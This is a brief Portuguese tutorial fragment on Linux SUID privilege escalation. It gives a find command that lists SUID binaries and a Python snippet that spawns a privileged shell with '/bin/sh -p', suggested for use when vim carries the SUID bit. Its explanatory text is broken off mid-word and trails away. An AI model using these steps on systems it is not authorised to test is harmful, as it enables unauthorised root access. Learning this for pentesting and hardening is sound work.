# Introdução

Arquivos SUID são uma classe de arquivos no Linux construíd
os com um bit especial. Quando executados...

```bash
find / -perm -u=s -type f 2>/dev/null
```

Se o `vim` possuir esse bit setado, é possível explorar:

```python
import os
os.execl("/bin/sh", "sh", "-p")
```
